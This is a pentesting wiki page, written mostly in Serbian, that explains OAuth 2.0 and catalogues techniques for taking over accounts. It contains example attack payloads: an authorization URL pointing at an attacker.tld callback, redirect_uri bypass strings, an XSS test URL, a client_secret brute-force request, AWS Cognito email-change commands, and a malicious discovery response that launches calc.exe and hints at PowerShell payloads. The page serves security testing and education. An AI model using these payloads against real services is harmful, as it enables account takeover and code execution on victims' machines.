# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Osnovne informacije <a href="#d4a8" id="d4a8"></a>

OAuth nudi različite verzije, a osnovne informacije su dostupne na [OAuth 2.0 documentation](https://oauth.net/2/). Ova diskusija se prvenstveno fokusira na široko korišćeni [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), koji pruža **okvir za autorizaciju koji omogućava aplikaciji da pristupi ili izvrši radnje na korisničkom nalogu u drugoj aplikaciji** (autorizacioni server).

Zamislite hipotetički sajt _**https://example.com**_, kreiran da **prikaže sve vaše objave na društvenim mrežama**, uključujući privatne. Za to se koristi OAuth 2.0. _https://example.com_ će tražiti vaše dopuštenje da **pristupi vašim objavama na društvenoj mreži**. Kao rezultat, na _https://socialmedia.com_ će se pojaviti consent screen koji prikazuje **dozvole koje se traže i developera koji traži pristup**. Nakon vaše autorizacije, _https://example.com_ dobija mogućnost da **pristupi vašim objavama u vaše ime**.

Važno je razumeti sledeće komponente unutar OAuth 2.0 okvira:

- **resource owner**: Vi, kao **user/entity**, odobravate pristup svom resursu, na primer objavama na nalogu društvenih mreža.
- **resource server**: Server koji obrađuje autentifikovane zahteve nakon što aplikacija dobije `access token` u ime `resource owner`, npr. **https://socialmedia.com**.
- **client application**: Aplikacija koja traži autorizaciju od `resource owner`, kao što je **https://example.com**.
- **authorization server**: Server koji izdaje `access tokens` klijent-aplikaciji nakon uspešne autentifikacije `resource owner` i dobijene autorizacije, npr. **https://socialmedia.com**.
- **client_id**: Javni, jedinstveni identifikator aplikacije.
- **client_secret:** Povjerljivi ključ poznat samo aplikaciji i authorization serveru, korišćen za generisanje `access_tokens`.
- **response_type**: Vrednost koja specificira **tip tokena koji se traži**, npr. `code`.
- **scope**: Nivo pristupa koji `client application` traži od `resource owner`.
- **redirect_uri**: URL na koji se korisnik preusmerava nakon autorizacije. Obično mora odgovarati prethodno registrovanom redirect URL-u.
- **state**: Parametar za **održavanje podataka tokom preusmeravanja korisnika ka i sa authorization servera**. Njegova jedinstvenost je ključna za funkcionisanje kao **CSRF zaštita**.
- **grant_type**: Parametar koji označava **tip grant-a i tip tokena koji će biti vraćen**.
- **code**: Autorizacioni kod od `authorization server`-a, koji klijent-aplikacija koristi zajedno sa `client_id` i `client_secret` da bi pribavila `access_token`.
- **access_token**: Token koji `client application` koristi za API zahteve u ime `resource owner`.
- **refresh_token**: Omogućava aplikaciji da **dobije novi `access_token` bez ponovnog zahtevanja od korisnika**.

### Flow

Sam OAuth tok ide na sledeći način:

1. Posetite [https://example.com](https://example.com) i kliknete na dugme “Integrate with Social Media”.
2. Sajt potom šalje zahtev ka [https://socialmedia.com](https://socialmedia.com) tražeći vašu autorizaciju da aplikacija sa https://example.com pristupi vašim objavama. Zahtev je strukturiran kao:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Zatim vam se prikazuje stranica za odobrenje.
4. Nakon vašeg odobrenja, društvena mreža šalje odgovor na `redirect_uri` sa parametrima `code` i `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com koristi ovaj `code`, zajedno sa svojim `client_id` i `client_secret`, да izvrši serverski zahtev како би добио `access_token` у ваше име, омогућавајући приступ дозволама којима сте пристали:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Na kraju, proces se završava kada https://example.com koristi vaš `access_token` da izvrši API poziv na Social Media kako bi pristupio

## Ranljivosti <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Prema [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), authorization server mora preusmeravati pregledač samo na **pre-registrirane, tačne redirect URIs**. Bilo koja slabost ovde omogućava napadaču da pošalje žrtvu kroz zlonamerni authorization URL tako da IdP isporuči žrtvin `code` (i `state`) direktno na napadačev endpoint, koji ga potom može razmeniti i pokupiti tokene.

Tipičan tok napada:

1. Sastaviti `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` i poslati ga žrtvi.
2. Žrtva se autentifikuje i odobri scope-ove.
3. IdP preusmeri na `attacker.tld/callback?code=<victim-code>&state=...` gde napadač zabeleži zahtev i odmah razmeni code.

Uobičajeni propusti validacije za testiranje:

- **Nema validacije** – prihvata se bilo koji apsolutni URL, što rezultira trenutnom krađom code-a.
- **Slabe substring/regex provere hosta** – zaobići se može sa lookalike domenima kao što su `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, ili `match.com@evil.com`.
- **IDN homograph neusklađenosti** – validacija se vrši na punycode formi (`xn--`), ali pregledač preusmerava na Unicode domen koji kontroliše napadač.
- **Arbitrarni putevi na dozvoljenom hostu** – usmeravanje `redirect_uri` na `/openredirect?next=https://attacker.tld` ili bilo koji XSS/user-content endpoint otkriva code preko lančanih preusmeravanja, Referer header-a, ili injektovanog JavaScript-a.
- **Ograničenja direktorijuma bez normalizacije** – obrasci poput `/oauth/*` mogu se zaobići sa `/oauth/../anything`.
- **Wildcard subdomeni** – prihvatanje `*.example.com` znači da bilo koji takeover (dangling DNS, S3 bucket, itd.) odmah daje validan callback.
- **Non-HTTPS callbacks** – propuštanje `http://` URI-ja daje mrežnim napadačima (Wi-Fi, corporate proxy) priliku da pokupе code u tranzitu.

Takođe pregledajte pomoćne redirect-stil parametre (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, itd.) i OpenID discovery dokument (`/.well-known/openid-configuration`) za dodatne endpoint-e koji mogu naslediti iste propuste validacije.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Kao što je pomenuto u ovom bug bounty izveštaju [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), moguće je da se redirect **URL reflektuje u odgovoru** servera nakon što se korisnik autentifikuje, i da je time **vulnerable to XSS**. Mogući payload za testiranje:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Neispravno rukovanje state parametrom <a href="#bda5" id="bda5"></a>

The `state` parameter is the Authorization Code flow CSRF token: the client must generate a **cryptographically random value per browser instance**, persist it somewhere only that browser can read (cookie, local storage, etc.), send it in the authorization request, and reject any response that does not return the same value. Whenever the value is static, predictable, optional, or not tied to the user’s session, the attacker can finish their own OAuth flow, capture the final `?code=` request (without sending it), and later coerce a victim browser into replaying that request so the victim account becomes linked to the attacker’s identity provider profile.

The replay pattern is always the same:

1. Napadač se autentifikuje na IdP sa svojim nalogom i presreće poslednji redirect koji sadrži `code` (i eventualno `state`).
2. Odbaci taj zahtev, sačuva URL, i kasnije iskoristi neki CSRF primitiv (link, iframe, auto-submitting form) da prisili browser žrtve da ga učita.
3. Ako klijent ne primenjuje `state`, aplikacija prihvata napadačev autorizacioni rezultat i loguje napadača u nalog žrtve u aplikaciji.

Praktičan kontrolni spisak za rukovanje `state` tokom testiranja:

- **Missing `state` entirely** – ako se parametar nikada ne pojavljuje, ceo login je CSRFable.
- **`state` not required** – uklonite ga iz početnog zahteva; ako IdP i dalje izdaje code-ove koje klijent prihvata, odbrana je opt-in.
- **Returned `state` not validated** – modifikujte vrednost u odgovoru (Burp, MITM proxy). Prihvatanje neusklađenih vrednosti znači da se sačuvani token nikad ne upoređuje.
- **Predictable or purely data-driven `state`** – mnoge aplikacije ubacuju redirect puteve ili JSON blob-ove u `state` bez dodavanja entropije, što napadačima omogućava da pogode validne vrednosti i replay-ju tokove. Uvek prepend/append-ujte jaku entropiju pre enkodiranja podataka.
- **`state` fixation** – ako aplikacija dozvoljava korisnicima da dostave vrednost `state` (npr. preko crafted authorization URL-a) i ponovo je koristi kroz tok, napadač može „zaključati“ poznatu vrednost i ponovo je koristiti na više žrtava.

PKCE can complement `state` (especially for public clients) by binding the authorization code to a code verifier, but web clients must still track `state` to prevent cross-user CSRF/account-linking bugs.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: Napadači mogu preventivno napraviti nalog koristeći email žrtve. Ako žrtva kasnije koristi third-party servis za login, aplikacija može nenamerno povezati taj third-party nalog sa napadačevim prethodno kreiranim nalogom, što vodi do neautorizovanog pristupa.
2. **Exploiting Lax OAuth Email Verification**: Napadači mogu iskoristiti OAuth servise koji ne verifikuju email tako što se registruju kod njih, pa potom promene email naloga na email žrtve. Ova metoda isto tako rizikuje neautorizovan pristup nalogu, slično prvom scenariju ali kroz drugačiji vektor napada.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

The `client_id` is intentionally public, but the **`client_secret` must never be recoverable by end users**. Authorization Code deployments that embed the secret in **mobile APKs, desktop clients, or single-page apps** effectively hand that credential to anyone who can download the package. Always inspect public clients by:

- Unpacking the APK/IPA, desktop installer, or Electron app and grepping for `client_secret`, Base64 blobs that decode to JSON, or hard-coded OAuth endpoints.
- Reviewing bundled config files (plist, JSON, XML) or decompiled strings for client credentials.

Once the attacker extracts the secret they only need to steal any victim authorization `code` (via a weak `redirect_uri`, logs, etc.) to independently hit `/token` and mint access/refresh tokens without involving the legitimate app. Treat public/native clients as **incapable of holding secrets**—they should instead rely on PKCE (RFC 7636) to prove possession of a per-instance code verifier instead of a static secret. During testing, confirm whether PKCE is mandatory and whether the backend actually rejects token exchanges that omit either the `client_secret` **or** a valid `code_verifier`.

### Client Secret Bruteforce

Možete pokušati da **bruteforce**-ujete `client_secret` servis provajdera identiteta kako biste pokušali da ukradete naloge.\
Zahtev za BF može izgledati slično:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer/Header/Location artifacts leaking Code + State

Once the client has the **code and state**, if they surface in **`location.href`** or **`document.referrer`** and are forwarded to third parties, they leak. Two recurring patterns:

- **Classic Referer leak**: after the OAuth redirect, any navigation that keeps `?code=&state=` in the URL will push them into the **Referer** header sent to CDNs/analytics/ads.
- **Telemetry/analytics confused deputy**: some SDKs (pixels/JS loggers) react to `postMessage` events and then **send the current `location.href`/`referrer` to backend APIs using a token supplied in the message**. If you can inject your own token into that flow (e.g., via an attacker-controlled postMessage relay), you can later read the SDK’s API request history/logs and recover the victim’s OAuth artifacts embedded in those requests.


### Access Token Stored in Browser History

The core guarantee of the Authorization Code grant is that **access tokens never reach the resource owner’s browser**. When implementations leak tokens client-side, any minor bug (XSS, Referer leak, proxy logging) becomes instant account compromise. Always check for:

- **Tokens in URLs** – if `access_token` appears in the query/fragment, it lands in browser history, server logs, analytics, and Referer headers sent to third parties.
- **Tokens transiting untrusted middleboxes** – returning tokens over HTTP or through debugging/corporate proxies lets network observers capture them directly.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, or serialized JSON blobs expose tokens to every script on the origin (including XSS payloads or malicious extensions).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` retain tokens long after logout on shared devices and are script-accessible.

Any of these findings usually upgrades otherwise “low” bugs (like a CSP bypass or DOM XSS) into full API takeover because the attacker can simply read and replay the leaked bearer token.

### Everlasting Authorization Code

Authorization codes must be **short-lived, single-use, and replay-aware**. When assessing a flow, capture a `code` and:

- **Test the lifetime** – RFC 6749 recommends minutes, not hours. Try redeeming the code after 5–10 minutes; if it still works, the exposure window for any leaked code is excessive.
- **Test sequential reuse** – send the same `code` twice. If the second request yields another token, attackers can clone sessions indefinitely.
- **Test concurrent redemption/race conditions** – fire two token requests in parallel (Burp intruder, turbo intruder). Weak issuers sometimes grant both.
- **Observe replay handling** – a reuse attempt should not only fail but also revoke any tokens already minted from that code. Otherwise, a detected replay leaves the attacker’s first token active.

Combining a replay-friendly code with any `redirect_uri` or logging bug allows persistent account access even after the victim completes the legitimate login.

### Authorization/Refresh Token not bound to client

If you can get the **authorization code** and **redeem it for a different client/app**, you can takeover other accounts. Test for weak binding by:

- Capturing a `code` for **app A** and sending it to **app B’s token endpoint**; if you still receive a token, audience binding is broken.
- Trying first-party token minting endpoints that should be restricted to their own client IDs; if they accept arbitrary `state`/`app_id` while only validating the code, you effectively perform an **authorization-code swap** to mint higher-privileged first-party tokens.
- Checking whether client binding ignores nonce/redirect URI mismatches. If an error page still loads SDKs that log `location.href`, combine with Referer/telemetry leaks to steal codes and redeem them elsewhere.

Any endpoint that exchanges `code` → token **must** verify the issuing client, redirect URI, and nonce; otherwise, a stolen code from any app can be upgraded to a first-party access token.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Pogledajte ovaj post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Za detaljnije informacije o tome kako zloupotrebiti AWS Cognito pogledajte [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abusing other Apps tokens <a href="#bda5" id="bda5"></a>

Kao što je [**navedeno u ovom writeupu**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth tokovi koji očekuju da prime **token** (a ne code) mogu biti ranjivi ako ne provere da li token pripada aplikaciji.

Ovo je zato što bi **napadač** mogao da kreira **aplikaciju koja podržava OAuth i logovanje preko Facebook** (na primer) u svojoj sopstvenoj aplikaciji. Zatim, kada žrtva prijavi preko Facebook-a u napadačevoj aplikaciji, napadač bi mogao da dobije **OAuth token korisnika dodeljen njegovoj aplikaciji**, i iskoristi ga da se uloguje u žrtvinu OAuth aplikaciju koristeći korisnički token žrtve.

> [!CAUTION]
> Dakle, ako napadač uspe da natera korisnika da pristupi njegovoj OAuth aplikaciji, moći će da preuzme nalog žrtve u aplikacijama koje očekuju token i ne proveravaju da li je token bio dodeljen njihovom app ID-u.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Prema [**ovom writeupu**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), bilo je moguće naterati žrtvu da otvori stranicu sa **returnUrl** koji pokazuje na napadačev host. Ta informacija bi bila **smeštena u cookie (RU)** i u **kasnijem koraku** **prompt** će **pitati** **korisnika** da li želi da da pristup tom napadačevom hostu.

Da bi se zaobišao ovaj prompt, bilo je moguće otvoriti tab koji pokreće **Oauth flow** koji bi postavio RU cookie koristeći **returnUrl**, zatvoriti tab pre nego što se prompt prikaže, i otvoriti novi tab bez te vrednosti. Tada, **prompt neće obavestiti o napadačevom hostu**, ali cookie bi bio postavljen na njega, tako da će **token biti poslat na napadačev host** pri redirekciji.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Kao što je objašnjeno u [**ovom videu**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), neke OAuth implementacije dozvoljavaju da se GET parametar **`prompt`** postavi na None (**`&prompt=none`**) kako bi se **sprečilo da se korisnici pitaju za potvrdu** datog pristupa u web promptu ako su već prijavljeni na platformu.

### response_mode

Kao što je [**objašnjeno u ovom videu**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), može biti moguće navesti parametar **`response_mode`** da bi se odredilo gde želite da se code prosledi u finalnom URL-u:

- `response_mode=query` -> Code se prosleđuje unutar GET parametra: `?code=2397rf3gu93f`
- `response_mode=fragment` -> Code se prosleđuje unutar fragmenta URL-a `#code=2397rf3gu93f`
- `response_mode=form_post` -> Code se prosleđuje unutar POST forme sa inputom nazvanim `code` i vrednošću
- `response_mode=web_message` -> Code se šalje u post poruci: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login dijalozi su idealne mete za clickjacking: ako se mogu ugraditi u frame, napadač može prekriti prilagođene grafike, sakriti prave dugmiće i prevariti korisnike da odobre opasne scope-ove ili povežu naloge. Napravite PoC-e koji:

1. Učita IdP authorization URL unutar `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Koristi trikove sa apsolutnim pozicioniranjem/opacity da poravna lažna dugmad sa skrivenim **Allow**/**Approve** kontrolama.
3. Opcionalno pre-popunite parametre (scopes, redirect URI) tako da ukradeno odobrenje odmah koristi napadaču.

Tokom testiranja proverite da li IdP stranice emituju `X-Frame-Options: DENY/SAMEORIGIN` ili restriktivan `Content-Security-Policy: frame-ancestors 'none'`. Ako nijedno nije prisutno, demonstrirajte rizik alatima kao što je [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) i zabeležite koliko lako žrtva autorizuje napadačevu aplikaciju. Za dodatne ideje za payload pogledajte [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

Prema [**ovom blog postu**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), ovo je OAuth flow koji omogućava prijavu u OAuth putem **username** i **password**. Ako tokom ovog jednostavnog toka bude vraćen **token** sa pristupom svim akcijama koje korisnik može da izvrši, onda je moguće zaobići 2FA koristeći taj token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Ovaj [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) objašnjava kako je bilo moguće zloupotrebiti **open redirect** baziran na vrednosti iz **referrer-a** da bi se zloupotrebio OAuth za ATO. Napad je bio:

1. Žrtva pristupi napadačevoj web stranici
2. Žrtva otvori zlonamerni link i opener pokreće Google OAuth flow sa `response_type=id_token,code&prompt=none` kao dodatnim parametrima koristeći kao **referrer napadačev web sajt**.
3. U openeru, nakon što provajder autorizuje žrtvu, on ih vraća nazad na vrednost `redirect_uri` parametra (žrtvin web) sa 30X kodom koji i dalje zadržava napadačev sajt u refereru.
4. Žrtvin **website okida open redirect baziran na refereru** preusmeravajući žrtvu na napadačev sajt; pošto je **`respose_type`** bio **`id_token,code`**, code će biti poslat nazad napadaču u **fragmentu** URL-a, omogućavajući mu da preuzme nalog korisnika preko Google-a na žrtvinu stranicu.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Pogledajte ovo istraživanje**](https://portswigger.net/research/hidden-oauth-attack-vectors) **Za dalje detalje ove tehnike.**

Dynamic Client Registration u OAuth-u predstavlja manje očigledan ali kritičan vektor za bezbednosne ranjivosti, konkretno za **Server-Side Request Forgery (SSRF)** napade. Ovaj endpoint omogućava OAuth serverima da primaju detalje o client aplikacijama, uključujući osetljive URL-ove koji mogu biti zloupotrebljeni.

Key Points:

- **Dynamic Client Registration** se često mapira na `/register` i prihvata detalje kao što su `client_name`, `client_secret`, `redirect_uris`, i URL-ove za logoe ili JSON Web Key Sets (JWKs) putem POST zahteva.
- Ova funkcija je u skladu sa specifikacijama iz **RFC7591** i **OpenID Connect Registration 1.0**, koje uključuju parametre potencijalno podložne SSRF-u.
- Proces registracije može nenamerno izložiti servere SSRF-u na nekoliko načina:
- **`logo_uri`**: URL za logo client aplikacije koji server može preuzeti, zbog čega može doći do SSRF-a ili XSS-a ako se URL nepravilno obradi.
- **`jwks_uri`**: URL do JWK dokumenta klijenta, koji ako je zlonamerno kreiran može naterati server da izvrši odlazne zahteve ka serveru pod kontrolom napadača.
- **`sector_identifier_uri`**: Referencira JSON niz `redirect_uris`, koji server može preuzeti, stvarajući mogućnost za SSRF.
- **`request_uris`**: Navodi dozvoljene request URI-je za klijenta, koji se mogu zloupotrebiti ako server preuzme ove URI-je na početku autorizacionog procesa.

Exploitation Strategy:

- SSRF se može pokrenuti registracijom novog klijenta sa zlonamernim URL-ovima u parametrima kao što su `logo_uri`, `jwks_uri`, ili `sector_identifier_uri`.
- Dok direktna zloupotreba putem `request_uris` može biti ublažena whitelist kontrolama, dostavljanje unapred registrovanog `request_uri` pod kontrolom napadača može olakšati SSRF tokom autorizacione faze.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Istraživanje o [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (koje pogađa `mcp-remote` klijente kao što su Claude Desktop, Cursor ili Windsurf) pokazuje kako **dynamic OAuth discovery postaje RCE primitiv** kad god klijent prosledi IdP metadata direktno operativnom sistemu. Remote MCP server vraća napadačem kontrolisani `authorization_endpoint` tokom discovery razmene (`/.well-known/openid-configuration` ili bilo koji metadata RPC). `mcp-remote ≤0.1.15` bi potom pozvao sistemski URL handler (`start`, `open`, `xdg-open`, itd.) sa bilo kojim primljenim stringom, tako da bilo koji scheme/path koji OS podržava bude izvršen lokalno.

Attack workflow

1. Usmerite desktop agenta na zlonamerni MCP/OAuth server (`npx mcp-remote https://evil`). Agent prima `401` plus metadata.
2. Server odgovara JSON-om kao:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. Klijent pokreće OS handler za dostavljeni URI. Windows prihvata payload-e kao `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux prihvataju `file:///Applications/Calculator.app/...` ili čak prilagođene sheme poput `cmd://bash -lc '<payload>'` ako su registrovane.
4. Pošto se ovo dešava pre bilo kakve korisničke interakcije, **samo konfigurisanje klijenta da komunicira sa serverom napadača dovodi do izvršavanja koda**.

**Kako testirati**

- Ciljajte bilo koji OAuth-capable desktop/agent koji vrši discovery preko HTTP(S) i otvara vraćene endpoint-e lokalno (Electron apps, CLI helpers, thick clients).
- Interceptujte ili hostujte discovery response i zamenite `authorization_endpoint`, `device_authorization_endpoint`, ili slična polja sa `file://`, `cmd://`, UNC paths, ili drugim opasnim shemama.
- Posmatrajte da li klijent validira scheme/host. Nedostatak validacije rezultira trenutnim izvršavanjem u kontekstu korisnika i dokazuje problem.
- Ponavljajte sa različitim shemama da mapirate celokupnu attack surface (npr. `ms-excel:`, `data:text/html,`, custom protocol handlers) i demonstrirajte cross-platform reach.

## OAuth providers Race Conditions

Ako je platforma koju testirate OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

U OAuth-u, polje `sub` jedinstveno identifikuje korisnika, ali njegov format varira između Authorization Server-a. Da bi standardizovali identifikaciju korisnika, neki klijenti koriste emailove ili user handles. Međutim, to je rizično jer:

- Neki Authorization Server-i ne osiguravaju da ove osobine (kao email) ostanu nepromenljive.
- U nekim implementacijama—kao što je **"Login with Microsoft"**—klijent se oslanja na polje email, koje je **kontrolisano od strane korisnika u Entra ID** i nije verifikovano.
- Napadač može iskoristiti ovo kreiranjem sopstvene Azure AD organizacije (npr. doyensectestorg) i koristeći je za Microsoft login.
- Iako je Object ID (smešten u `sub`) nepromenljiv i bezbedan, oslanjanje na promenljivo polje email može omogućiti account takeover (na primer, preuzimanje naloga poput victim@gmail.com).

## Client Confusion Attack

U **Client Confusion Attack**, aplikacija koja koristi OAuth Implicit Flow ne uspeva da verifikuje da je finalni access token specifično generisan za njen sopstveni Client ID. Napadač postavlja javni sajt koji koristi Google’s OAuth Implicit Flow, obmanjujući na hiljade korisnika da se uloguju i tako prikupljajući access tokene namenjene napadačevom sajtu. Ako ti korisnici imaju naloge i na nekom drugom ranjivom vebsajtu koji ne verifikuje Client ID tokena, napadač može ponovo iskoristiti prikupljene tokene da se lažno predstavlja kao žrtve i preuzme njihove naloge.

## Scope Upgrade Attack

Tip **Authorization Code Grant** podrazumeva sigurnu server-to-server komunikaciju za prenos korisničkih podataka. Međutim, ako **Authorization Server** implicitno veruje scope parametru u Access Token Requestu (parametar koji nije definisan u RFC-u), zlonamerna aplikacija može povećati privilegije authorization koda zahtevajući veći scope. Nakon što se **Access Token** generiše, **Resource Server** mora da ga verifikuje: za JWT tokene to uključuje proveru JWT potpisa i izdvajanje podataka kao što su `client_id` i `scope`, dok za tokene koji su slučajni string server mora da query-uje Authorization Server da dobije detalje o tokenu.

## Redirect Scheme Hijacking

U mobilnim OAuth implementacijama, aplikacije koriste **custom URI schemes** da primaju redirekte sa Authorization Codes. Međutim, pošto više aplikacija može registrovati istu shemu na uređaju, pretpostavka da samo legitimni klijent kontroliše redirect URI je povređena. Na Androidu, na primer, Intent URI kao `com.example.app://` oauth se hvata na osnovu scheme i opcionih filtera definisanih u app-ovom intent-filter-u. Pošto Android-ovo intent resolution može biti široko—posebno ako je navedena samo shema—napadač može registrovati zlonamernu aplikaciju sa pažljivo konstruisanim intent filterom da hijackuje authorization code. Ovo može **omogućiti account takeover** bilo kroz korisničku interakciju (kada više aplikacija može da obradi intent) ili preko bypass tehnika koje iskorišćavaju previše specifične filtere, kako je detaljisano u Ostorlab's assessment flowchart.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)

{{#include ../banners/hacktricks-training.md}}
